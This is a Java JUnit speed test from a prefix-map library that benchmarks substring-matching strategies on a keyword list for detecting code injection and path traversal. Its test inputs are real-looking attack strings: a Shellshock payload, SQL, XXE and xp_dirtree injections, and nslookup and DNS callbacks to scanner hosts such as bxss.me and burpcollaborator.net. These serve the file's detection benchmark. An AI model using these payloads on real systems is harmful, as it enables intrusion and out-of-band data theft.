/*
 * Copyright (C) 2018-2020 Niels Basjes
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package nl.basjes.collections.prefixmap.speed.contains;

import nl.basjes.collections.PrefixMap;
import nl.basjes.collections.prefixmap.ASCIIPrefixMap;
import nl.basjes.collections.prefixmap.StringPrefixMap;
import org.junit.jupiter.api.BeforeAll;
import org.junit.jupiter.api.Test;

import java.io.Serializable;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.TreeMap;

import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertNull;

/**
 * This is a set of preformance tests to verify a question:
 * I have a set of strings and I want to know if any of these string occur in my input.
 * Naive: for each case : if (input.contains(case)) ...
 * Can the prefixMap help here?
 * Results (on my machine):
 * -- For each case : if (input.contains(case)) ...
 * Early Speed stats SearchStringContains          (63 rules): 1000000 runs took  973ms -->  973ns each (=0us) .
 * Late  Speed stats SearchStringContains          (63 rules): 1000000 runs took 1417ms --> 1417ns each (=1us) .
 * No    Speed stats SearchStringContains          (63 rules): 1000000 runs took 1351ms --> 1351ns each (=1us) .
 *
 * -- Use the StringPrefixMap
 * Early Speed stats StringPrefixMapSearchContains (63 rules): 1000000 runs took 1015ms --> 1015ns each (=1us) .
 * Late  Speed stats StringPrefixMapSearchContains (63 rules): 1000000 runs took 1736ms --> 1736ns each (=1us) .
 * No    Speed stats StringPrefixMapSearchContains (63 rules): 1000000 runs took 2055ms --> 2055ns each (=2us) .
 *
 * -- Use the ASCIIPrefixMap
 * Early Speed stats ASCIIPrefixMapSearchContains  (63 rules): 1000000 runs took  374ms -->  374ns each (=0us) .
 * Late  Speed stats ASCIIPrefixMapSearchContains  (63 rules): 1000000 runs took  633ms -->  633ns each (=0us) .
 * No    Speed stats ASCIIPrefixMapSearchContains  (63 rules): 1000000 runs took  786ms -->  786ns each (=0us) .
 */
public class ContainsMapSpeedTests {

    public interface BaseSearchContains<V> {
        void putAll(Map<? extends String, ? extends V> m);
        void clear();
        V search(String input);
        int size();
    }

    public static class ASCIIPrefixMapSearchContains<V extends Serializable> implements BaseSearchContains<V> {
        private final PrefixMap<V> prefixMap;
        private int shortestSubstringLength = Integer.MAX_VALUE;

        ASCIIPrefixMapSearchContains() {
            this(new ASCIIPrefixMap<>(false));
        }

        ASCIIPrefixMapSearchContains(PrefixMap<V> prefixMap) {
            this.prefixMap = prefixMap;
        }

        public void putAll(Map<? extends String, ? extends V> m) {
            m.forEach((k, v) -> {
                prefixMap.put(k, v);
                shortestSubstringLength = Math.min(shortestSubstringLength, k.length());
            });
        }

        @Override
        public void clear() {
            prefixMap.clear();
            shortestSubstringLength = Integer.MAX_VALUE;
        }

        @Override
        public V search(String input) {
            for (int startOffset = 0; startOffset <= input.length() - shortestSubstringLength; startOffset++) {
                V result = prefixMap.getShortestMatch(input, startOffset);
                if (result != null) {
                    return result;
                }
            }
            return null;
        }

        @Override
        public int size() {
            return prefixMap.size();
        }

    }

    public static class StringPrefixMapSearchContains<V extends Serializable> extends ASCIIPrefixMapSearchContains<V> {
        StringPrefixMapSearchContains() {
            super(new StringPrefixMap<>(false));
        }
    }

    public static class SearchStringContains<V> implements BaseSearchContains<V> {
        private final TreeMap<String, V> treeMap;

        SearchStringContains() {
            this.treeMap = new TreeMap<>();
        }

        public void putAll(Map<? extends String, ? extends V> m) {
            m.forEach((k, v) -> {
                String lowerK = k.toLowerCase();
                treeMap.put(lowerK, v);
            });
        }

        @Override
        public void clear() {
            treeMap.clear();
        }

        @Override
        public int size() {
            return treeMap.size();
        }

        @Override
        public V search(String input) {
            String lowerInput = input.toLowerCase(Locale.ENGLISH);
            for (Map.Entry<String, V> entry : treeMap.entrySet()) {
                String k = entry.getKey();
                if (lowerInput.contains(k)) {
                    return entry.getValue();
                }
            }
            return null;
        }
    }

    private static final Map<String, String> SEARCH_TERMS_MAP = new TreeMap<>();
    private static final List<String> TESTCASES_EARLY_MATCH   = new ArrayList<>();
    private static final List<String> TESTCASES_LATE_MATCH    = new ArrayList<>();
    private static final List<String> TESTCASES_NO_MATCH      = new ArrayList<>();

    @BeforeAll
    public static void beforeAll() {
        SEARCH_TERMS_MAP.put("() {",                   "Code Injection");
        SEARCH_TERMS_MAP.put("('') {",                 "Code Injection");
        SEARCH_TERMS_MAP.put("$(",                     "Code Injection");
        SEARCH_TERMS_MAP.put("{{",                     "Code Injection");
        SEARCH_TERMS_MAP.put("}}",                     "Code Injection");
        SEARCH_TERMS_MAP.put("curl ",                  "Code Injection");
        SEARCH_TERMS_MAP.put("wget ",                  "Code Injection");
        SEARCH_TERMS_MAP.put("bash",                   "Code Injection");
        SEARCH_TERMS_MAP.put("nslookup",               "Code Injection");
        SEARCH_TERMS_MAP.put("<script",                "Code Injection");
        SEARCH_TERMS_MAP.put("javascript:",            "Code Injection");
        SEARCH_TERMS_MAP.put("<img",                   "Code Injection");
        SEARCH_TERMS_MAP.put("onerror=",               "Code Injection");
        SEARCH_TERMS_MAP.put("eval(",                  "Code Injection");
        SEARCH_TERMS_MAP.put("atob(",                  "Code Injection");
        SEARCH_TERMS_MAP.put("SELECT ",                "Code Injection");
        SEARCH_TERMS_MAP.put("SELECT(",                "Code Injection");
        SEARCH_TERMS_MAP.put("CASE WHEN",              "Code Injection");
        SEARCH_TERMS_MAP.put("UNION ALL",              "Code Injection");
        SEARCH_TERMS_MAP.put(" OR ",                   "Code Injection");
        SEARCH_TERMS_MAP.put(" OR NOT",                "Code Injection");
        SEARCH_TERMS_MAP.put("WAITFOR ",               "Code Injection");
        SEARCH_TERMS_MAP.put("ORDER BY",               "Code Injection");
        SEARCH_TERMS_MAP.put("FROM DUAL",              "Code Injection");
        SEARCH_TERMS_MAP.put("DECLARE ",               "Code Injection");
        SEARCH_TERMS_MAP.put("VARCHAR",                "Code Injection");
        SEARCH_TERMS_MAP.put("RLIKE ",                 "Code Injection");
        SEARCH_TERMS_MAP.put("1=1",                    "Code Injection");
        SEARCH_TERMS_MAP.put("PG_SLEEP(",              "Code Injection");
        SEARCH_TERMS_MAP.put("SLEEP(",                 "Code Injection");
        SEARCH_TERMS_MAP.put("<!ENTITY",               "Code Injection");
        SEARCH_TERMS_MAP.put("xmlns",                  "Code Injection");
        SEARCH_TERMS_MAP.put("chr(",                   "Code Injection");
        SEARCH_TERMS_MAP.put("concat(",                "Code Injection");
        SEARCH_TERMS_MAP.put("Socket.gethostbyname",   "Code Injection");
        SEARCH_TERMS_MAP.put("str(",                   "Code Injection");
        SEARCH_TERMS_MAP.put("__import__(",            "Code Injection");
        SEARCH_TERMS_MAP.put("gethostbyname(",         "Code Injection");
        SEARCH_TERMS_MAP.put("while(",                 "Code Injection");
        SEARCH_TERMS_MAP.put("print(",                 "Code Injection");
        SEARCH_TERMS_MAP.put("typeof",                 "Code Injection");
        SEARCH_TERMS_MAP.put("load_file",              "Code Injection");
        SEARCH_TERMS_MAP.put("bxss.me",                "Code Injection");
        SEARCH_TERMS_MAP.put("burp",                   "Code Injection");
        SEARCH_TERMS_MAP.put("orator.net",             "Code Injection");
        SEARCH_TERMS_MAP.put("path:",                  "Path Traversal");
        SEARCH_TERMS_MAP.put("file:",                  "Path Traversal");
        SEARCH_TERMS_MAP.put("../",                    "Path Traversal");
        SEARCH_TERMS_MAP.put("/..",                    "Path Traversal");
        SEARCH_TERMS_MAP.put("/./.",                   "Path Traversal");
        SEARCH_TERMS_MAP.put("..%2f",                  "Path Traversal");
        SEARCH_TERMS_MAP.put("%2e%2e%2f",              "Path Traversal");
        SEARCH_TERMS_MAP.put("%2e%2e/",                "Path Traversal");
        SEARCH_TERMS_MAP.put("%C0%2F",                 "Path Traversal");
        SEARCH_TERMS_MAP.put("%C0%AF",                 "Path Traversal");
        SEARCH_TERMS_MAP.put("..\\",                   "Path Traversal");
        SEARCH_TERMS_MAP.put("\\..",                   "Path Traversal");
        SEARCH_TERMS_MAP.put("..%5c",                  "Path Traversal");
        SEARCH_TERMS_MAP.put("%2e%2e%5c",              "Path Traversal");
        SEARCH_TERMS_MAP.put("%2e%2e\\",               "Path Traversal");
        SEARCH_TERMS_MAP.put("#exec",                  "Serverside execute");
        SEARCH_TERMS_MAP.put("#include",               "Serverside include");
        SEARCH_TERMS_MAP.put("JDatabaseDriverMysqli",  "Remote exec Joomla");

        // CHECKSTYLE.OFF: LineLength
        TESTCASES_EARLY_MATCH.add("\"<bgy xmlns=\\\"\"http://a.b/\\\"\" xmlns:xsi=\\\"\"http://www.w3.org/2001/XMLSchema-instance\\\"\" xsi:schemaLocation=\\\"\"http://a.b/ http://1xx2hack3host4xx5.burpcollaborator.net/bgy.xsd\\\"\">bgy</bgy>\"");
        TESTCASES_EARLY_MATCH.add("\"class s extends Function{constructor(e){if(super(),d.call(this),h(this,g(e)),0===this.cumulativeWeightIndexPairs.length)throw new Error(\\\"\"No user agents matched your filters.\\\"\");return this.randomize(),new Proxy(this,{apply:()=>this.random(),get:(e,t,i)=>{if(e.data&&\\\"\"string\\\"\"==typeof t&&Object.prototype.hasOwnProperty.call(e.data,t)&&Object.prototype.propertyIsEnumerable.call(e.data,t)){const i=e.data[t];if(void 0!==i)return i}return Reflect.get(e,t,i)}})}}\"");
        TESTCASES_EARLY_MATCH.add("\"$(nslookup hitbnwfgtfmmo82772.bxss.me||perl -e \\\"\"gethostbyname(''hitbnwfgtfmmo82772.bxss.me'')\\\"\")\"");
        TESTCASES_EARLY_MATCH.add("-1 OR 2+213-213-1=0+0+0+1");
        TESTCASES_EARLY_MATCH.add("\"() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \\\"\"bash_cve_2014_6278 Output : $((0+66))\\\"\"; }\"");

        TESTCASES_LATE_MATCH.add("\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36''+(function(){if(typeof loswd===\\\"\"undefined\\\"\"){var a=new Date();do{var b=new Date();}while(b-a<20000);loswd=1;}}())+''\"");
        TESTCASES_LATE_MATCH.add("\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36''||(select extractvalue(xmltype(''<?xml version=\\\"\"1.0\\\"\" encoding=\\\"\"UTF-8\\\"\"?><!DOCTYPE root [ <!ENTITY % fffol SYSTEM \\\"\"http://1xx2hack3host4xx5.burpcollab''||''orator.net/\\\"\">%fffol;]>''),''/l'') from dual)||''\"");
        TESTCASES_LATE_MATCH.add("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36''+(select load_file(''\\\\\\\\\\\\\\\\1xx2hack3host4xx5.burpcollaborator.net\\\\\\\\lui''))+''");
        TESTCASES_LATE_MATCH.add("\"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0''+(function(){if(typeof t6vnd===\\\"\"undefined\\\"\"){var a=new Date();do{var b=new Date();}while(b-a<20000);t6vnd=1;}}())+''\"");
        TESTCASES_LATE_MATCH.add("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36'';declare @q varchar(99);set @q=''\\\\\\\\1xx2hack3host4xx5.burpcollab''+''orator.net\\\\lxh''; exec master.dbo.xp_dirtree @q;--");

        TESTCASES_NO_MATCH.add("Mozilla/5.0 (Linux; Android 5.1.1; Nexus 5 Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.65 Mobile Safari/537.36");
        TESTCASES_NO_MATCH.add("Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G920F/G920FXXEinterim Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36");
        TESTCASES_NO_MATCH.add("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4321.0 Safari/537.36 Edg/88.0.702.0");
        TESTCASES_NO_MATCH.add("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; th-th) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8");
        TESTCASES_NO_MATCH.add("Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)");
        // CHECKSTYLE.ON: LineLength
    }

    void preheat(BaseSearchContains<?> map) {
        // Heat it up
        for (int i = 0; i< 10000; i++) {
            for (String testcase: TESTCASES_EARLY_MATCH) {
                map.search(testcase);
            }
            for (String testcase: TESTCASES_LATE_MATCH) {
                map.search(testcase);
            }
            for (String testcase: TESTCASES_NO_MATCH) {
                map.search(testcase);
            }
        }
    }

    void run(BaseSearchContains<?> map, String label, List<String> testCases, long iterations, boolean mustHaveResult) {
        long start = System.nanoTime();
        for (int i = 0; i < (iterations/testCases.size()); i++) {
            for (String testcase: testCases) {
                if (mustHaveResult) {
                    assertNotNull(map.search(testcase), testcase);
                } else {
                    assertNull(map.search(testcase), testcase);
                }
            }
        }
        long stop = System.nanoTime();
        System.out.println(label + " Speed stats " + map.getClass().getSimpleName() +
            "\t (" + map.size() + "\t rules): " +
            iterations + " runs took " +
            ((stop - start)/1000000) + "ms --> " +
            ((stop - start)/iterations) + "ns each (=" +
            (((stop - start)/iterations)/1000) + "us) .");
    }

    void runTest(BaseSearchContains<String> map) {
        map.clear();
        map.putAll(SEARCH_TERMS_MAP);
        long iterations = 1000000;
        preheat(map);
        run(map, "Early", TESTCASES_EARLY_MATCH, iterations, true);
        run(map, "Late ", TESTCASES_LATE_MATCH,  iterations, true);
        run(map, "No   ", TESTCASES_NO_MATCH,    iterations, false);
    }

    @Test
    public void testStringContains() {
        runTest(new SearchStringContains<>());
    }

    @Test
    public void testStringPrefix() {
        runTest(new StringPrefixMapSearchContains<>());
    }

    @Test
    public void testASCIIPrefix() {
        runTest(new ASCIIPrefixMapSearchContains<>());
    }
}
